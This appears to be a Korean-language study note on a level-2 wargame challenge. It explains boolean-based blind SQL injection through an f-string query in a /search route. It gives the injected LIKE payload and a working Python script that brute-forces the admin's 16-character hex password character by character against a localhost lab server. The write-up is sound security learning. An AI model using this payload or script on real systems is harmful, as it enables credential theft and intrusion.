# 배운 점

boolean-based blind SQL injection - sql injection에 아직 깊게 공부하지 않았지만 세부적으로 분류가 나뉜다는 것을 알게됐으며, `SELECT COUNT(*) FROM secret_data WHERE title LIKE '%{query}%'` 리턴하는 값을 통해서 정답인지 아닌지를 구별해낼 수 있는 방식을 boolean-based라고 부른 다는 사실과 해당 라우트에서 이런방식을 적용할 수 있는 라우트인 `/search`와 같은 곳이 oracle의 역할을 한다고 불린다는 것을 알게됐다.
평소에 개발할때 크게 신경쓰지 않았던 동적으로 적용되게 설계한 `f-string`과 같은 sql의 경우, sql 인젝션같은 취약점이 들어날 수 있다는 것을 다시 한번 느꼈다.

# 풀이 과정 기록

아무런 정보가 처음에 없어 파이썬 코드를 보며 뭐가 문제일까를 생각하다 `/search`에 적용된 sql코드와 다른 라우트에 적용된 sql코드의 형식에 차이가 나는 점을 확인하고 sql 인젝션으로 접근하였다. 초반이 좀 막연했지만 단서를 얻고 진행하여 클리어할 수 있었다.

# 익스플로잇 코드 정리

```sql
#기존 쿼리문
SELECT COUNT(*)
FROM secret_data
WHERE title LIKE '%

# 추가한 쿼리문
' AND (
  SELECT password
  FROM users
  WHERE username = 'admin'
) LIKE '0

# 나머지 쿼리문
%'
```

```python
import requests

HEX = "0123456789abcdef"

answer = ""

# 비밀번호가 16자리이므로 해당 비밀번호를 채울때까지 반복
while len(answer) < 16:
    for i in HEX:
        # 비밀번호가 될 수 있는 임시 후보자
        candidate = answer + i

        # 서버 요청
        response = requests.post(
            url="http://localhost:8000/search",
            data={
                "query": f"'AND (SELECT password FROM users WHERE username = 'admin') LIKE '{candidate}"
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )

        # 서버의 응답값 판별 후 반복
        if response.text.find("Data exists in our records.") != -1:
            answer = candidate
            print("ing :", answer)
            break

print("answer:", answer)

```

# 심화 학습 (Deep Dive)

# 한 줄 평

"당시에 풀때는 생각보다 어렵고 오래걸렸는데 이게 레벨2네"

# 참고
